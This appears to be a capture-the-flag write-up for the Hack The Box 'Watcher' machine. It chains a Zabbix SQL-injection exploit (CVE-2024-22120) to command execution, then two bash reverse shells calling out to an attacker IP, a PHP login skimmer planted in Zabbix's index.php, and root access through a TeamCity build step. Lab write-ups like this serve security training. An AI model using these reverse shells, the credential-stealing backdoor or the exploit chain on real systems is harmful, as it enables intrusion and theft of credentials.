---
icon: campfire
cover: ../../../../.gitbook/assets/Screenshot 2026-02-03 215440.png
coverY: -11.332495285983658
---

# HTB-WATCHER(VL)

<figure><img src="../../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scan

I started with Rustscan to identify open ports on the target.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ rustscan -a 10.135.152.56 blah blah 
```

**Results - 4 Open Ports:**

* **22/tcp** - SSH (OpenSSH 8.9p1 Ubuntu)
* **80/tcp** - HTTP (Apache 2.4.52)
* **10050/tcp** - Zabbix Agent
* **10051/tcp** - Zabbix Trapper

**Key Findings:**

* Target running **Ubuntu 22.04 Jammy LTS**
* HTTP redirects to **watcher.vl**
* **Zabbix** monitoring software installed
* All ports show TTL 63 (Linux one hop away)

#### Hosts File Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ echo "10.135.152.56   watcher.vl" | sudo tee -a /etc/hosts
```

#### Subdomain Enumeration

I performed subdomain brute-forcing using ffuf:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ ffuf -u http://10.135.152.56 -H "Host: FUZZ.watcher.vl" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

**Discovery:**

* **zabbix.watcher.vl** - Status 200

Updated hosts file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ echo "10.135.152.56   watcher.vl zabbix.watcher.vl" | sudo tee /etc/hosts
```

***

### Enumeration

#### watcher.vl (Port 80)

The main site is a static HTML page for an uptime monitoring company with contact forms that don't actually process submissions.

**Directory Brute Force:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ feroxbuster -u http://watcher.vl -x html
```

No interesting paths discovered - just default Apache files.

#### zabbix.watcher.vl (Port 80)

The subdomain hosts a **Zabbix** login page.

**Zabbix Version:** 7.0.0alpha1 (visible in footer after guest login)

**Guest Access Available:** Clicking "Sign in as guest" provided access to a limited dashboard.

***

### Exploitation - CVE-2024-22120

#### Vulnerability Research

Research revealed **Zabbix 7.0.0alpha1** is vulnerable to multiple CVEs:

1. **CVE-2024-22116** - RCE (requires admin access)
2. **CVE-2024-42327** - SQL Injection (requires API token)
3. **CVE-2024-22120** - **SQL Injection in Audit Log** → RCE

**CVE-2024-22120 Details:**

* SQL injection in the `clientip` field of audit logs
* Time-based blind SQL injection
* Can extract admin session ID
* Leads to RCE via script execution

#### Preparing the Exploit

**Step 1: Gather Required Information**

I needed three pieces of information:

1. **Session ID** from zbx\_session cookie (base64 encoded):

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ echo "eyJzZXNzaW9uaWQiOiI1MmU5NjcyZDM3NTM2YTM3MDBmNDcwY2Q4NmUxNmM1NiIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NTk1NzQ1MzksInNpZ24iOiIwOTJjZDc2ODJiNDIyNWM2MTEwZTIyZDRlYjE0NWFkZDgyNTc4Mzk3MTM4MDE3ZWE5ZWU2NjRkZjg3Y2I4OTllIn0=" | base64 -d
{"sessionid":"52e9672d37536a3700f470cd86e16c56",...}
```

**Session ID:** 52e9672d37536a3700f470cd86e16c56

2. **Host ID** - Found by monitoring network traffic in Burp while on Monitoring → Hosts page.

**Host ID:** 10084

3. **Script ID** - Available scripts for the guest user (1 and 2, not 3 as in the POC).

#### Downloading and Configuring Exploit

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ git clone https://github.com/W01fh4cker/CVE-2024-22120-RCE.git

┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ cd CVE-2024-22120-RCE
```

The original script uses scriptid=3, which doesn't work for guest users. I modified it to use scriptid=1.

**Adding dependencies:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher/CVE-2024-22120-RCE]
└─$ uv add --script CVE-2024-22120-RCE.py pwntools requests
```

#### Executing the Exploit

**Method 1: Extract Admin Session (Slow - Time-based SQLi)**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher/CVE-2024-22120-RCE]
└─$ uv run --script CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid 52e9672d37536a3700f470cd86e16c56 --hostid 10084
```

**Output:**

```
(+) Extracting Zabbix config session key...
(+) session_key=b9857bc76e26cf108766043dbf43544b
(+) Extracting admin session_id...
(+) admin session_id=e29cc8d946f1a3135fe7ceec60d0ff0d
```

**Method 2: Direct RCE with cached admin session**

I modified the script to accept a `--admin-sid` parameter to skip the slow brute force:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher/CVE-2024-22120-RCE]
└─$ uv run --script CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --hostid 10084 --admin-sid e29cc8d946f1a3135fe7ceec60d0ff0d
```

**Pseudo-shell obtained:**

```
[zabbix_cmd]>>: id
uid=115(zabbix) gid=122(zabbix) groups=122(zabbix)
```

#### Getting a Reverse Shell

From the pseudo-shell, I executed a bash reverse shell:

```
[zabbix_cmd]>>: bash -c 'bash -i >& /dev/tcp/10.10.15.78/443 0>&1'
```

**Reverse shell received:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ nc -lnvp 443
Connection received on 10.135.152.56 58272
bash: cannot set terminal process group (7180): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@watcher:/$
```

**Shell upgrade:**

```bash
zabbix@watcher:/$ script /dev/null -c bash
zabbix@watcher:/$ ^Z

┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ stty raw -echo; fg
reset
Terminal type? screen
zabbix@watcher:/$
```

***

### Post-Exploitation Enumeration

#### Users

```bash
zabbix@watcher:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

#### Zabbix Database Credentials

```bash
zabbix@watcher:/$ cat /usr/share/zabbix/conf/zabbix.conf.php
```

**Database Credentials Found:**

* **User:** zabbix
* **Password:** uIy@YyshSuyW%0\_puSqA

#### MySQL Enumeration

```bash
zabbix@watcher:/$ mysql -h localhost -u zabbix -puIy@YyshSuyW%0_puSqA

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| zabbix             |
+--------------------+

mysql> use zabbix;

mysql> select username,passwd from users;
+----------+--------------------------------------------------------------+
| username | passwd                                                       |
+----------+--------------------------------------------------------------+
| Admin    | $2y$10$E9fSsSLiu47a1gnTULjx9.YygFRbVotGx4BOIVRTLdEa5OGAxeX5i |
| guest    | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
| Frank    | $2y$10$9WT5xXnxSfuFWHf5iJc.yeeHXbGkrU0S/M2LagY.8XRX7EZmh.kbS |
+----------+--------------------------------------------------------------+
```

The hashes didn't crack with rockyou.txt.

#### Discovering TeamCity

**Network enumeration:**

```bash
zabbix@watcher:/$ ss -tnlp
LISTEN   0     100    [::ffff:127.0.0.1]:8111        *:*
LISTEN   0     50     [::ffff:127.0.0.1]:9090        *:*
```

**Testing the service:**

```bash
zabbix@watcher:/$ curl -v localhost:8111
< HTTP/1.1 401 
< TeamCity-Node-Id: MAIN_SERVER
< WWW-Authenticate: Basic realm="TeamCity"
Authentication required
To login manually go to "/login.html" page
```

**Critical Finding:** TeamCity is running locally on port 8111!

**TeamCity processes:**

```bash
zabbix@watcher:/$ ps auxww | grep -i teamcity
root  669  sh teamcity-server.sh _start_internal
root  1234  java ... org.apache.catalina.startup.Bootstrap start
```

TeamCity is running as **root**!

***

### Gaining Admin Access to Zabbix

#### Method 1: CVE-2024-22120 Admin Cookie Generation

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher/CVE-2024-22120-RCE]
└─$ uv add --script CVE-2024-22120-LoginAsAdmin.py requests pwntools

┌──(sn0x㉿sn0x)-[~/HTB/Watcher/CVE-2024-22120-RCE]
└─$ uv run --script CVE-2024-22120-LoginAsAdmin.py --ip zabbix.watcher.vl --sid 52e9672d37536a3700f470cd86e16c56 --hostid 10084
```

**Generated Admin Cookie:**

```
zbx_session=eyJzZXNzaW9uaWQiOiJlMjljYzhkOTQ2ZjFhMzEzNWZlN2NlZWM2MGQwZmYwZCIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NTk2NjA4MzEsInNpZ24iOiI0YTg3NzA4MmI2MDUwNGY1MjU1MDU3N2QxZjRlZTllMDM0ZDM1MWVlZDRlZDZmNjRkZjE2MGI2MTkzZWRiOTQxIn0=
```

#### Method 2: Database Password Reset

Using Zabbix documentation, I reset the admin password:

```bash
mysql> UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
```

**New credentials:** Admin:zabbix

Successfully logged into Zabbix as Admin!

***

### Credential Harvesting via Zabbix Login Poisoning

#### Observing Frank's Activity

In Zabbix Audit Logs, I noticed **Frank** logging in every minute - an automated process!

#### Poisoning the Login Script

I modified `/usr/share/zabbix/index.php` to capture credentials:

```bash
zabbix@watcher:/usr/share/zabbix$ cp index.php{,.bak}
```

**Modified code (added after line 71):**

```php
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
    $user = $_POST['name'] ?? '??';
    $password = $_POST['password'] ?? '??';
    $f = fopen('/dev/shm/sn0x.txt', 'a+');
    fputs($f, "{$user}:{$password}\n");
    fclose($f);
```

**Uploading modified file:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ python3 -m http.server 80
```

```bash
zabbix@watcher:/usr/share/zabbix$ curl http://10.10.15.78/index.php -o index.php
```

#### Captured Credentials

Within a minute:

```bash
zabbix@watcher:/usr/share/zabbix$ cat /dev/shm/sn0x.txt
Frank:R%)3S7^Hf4TBobb(gVVs
```

**Credentials Obtained:**

* **Username:** Frank
* **Password:** R%)3S7^Hf4TBobb(gVVs

***

### Privilege Escalation via TeamCity

#### Setting Up SSH Tunnel

To access TeamCity running on localhost:8111, I created an SSH tunnel.

**Creating SSH access:**

```bash
zabbix@watcher:/var/lib/zabbix$ mkdir .ssh

zabbix@watcher:/var/lib/zabbix$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d sn0x@sn0x" > .ssh/authorized_keys

zabbix@watcher:/var/lib/zabbix$ chmod 700 .ssh/
zabbix@watcher:/var/lib/zabbix$ chmod 600 .ssh/authorized_keys
```

**Creating the tunnel:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ ssh -i ~/keys/ed25519_gen zabbix@10.135.152.56 -N -L 8111:localhost:8111
```

#### Accessing TeamCity

Navigated to `http://localhost:8111` in browser.

**TeamCity Version:** 2024.03.3

**Login:** Frank:R%)3S7^Hf4TBobb(gVVs ✓ Success!

Frank has **administrator access** to TeamCity!

#### Exploiting TeamCity for RCE

TeamCity is a CI/CD platform - I can create malicious build configurations that execute as root.

**Step 1: Create Project**

1. Clicked **"Create project..."**
2. Selected **"Manually"**
3. Project name: "sn0x-exploit"
4. Clicked **"Create"**

**Step 2: Create Build Configuration**

1. Clicked **"Create build configuration"**
2. Configuration name: "shell-exec"
3. Clicked **"Create"**
4. Clicked **"Skip"** for VCS Root

**Step 3: Add Build Step**

1. Selected **"Build Steps"** from sidebar
2. Clicked **"Add build step"**
3. Runner type: **"Command Line"**
4. Custom script:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.78/443 0>&1'
```

**Step 4: Execute**

1. Clicked **"Run"** button
2. Build process started

**Root shell received:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ nc -lnvp 443
Connection received on 10.135.152.56 37982
bash: cannot set terminal process group (632): Inappropriate ioctl for device
bash: no job control in this shell
root@watcher:/root/TeamCity/buildAgent/work/da3c5189dbf269a2#
```

**Shell upgrade:**

```bash
root@watcher:~# script /dev/null -c bash
root@watcher:~# ^Z

┌──(sn0x㉿sn0x)-[~/HTB/Watcher]
└─$ stty raw -echo; fg
reset
Terminal type? screen
root@watcher:~#
```

***

This box perfectly demonstrates how chaining multiple vulnerabilities - from initial SQL injection to final privilege escalation via CI/CD abuse - can lead to complete system compromise.
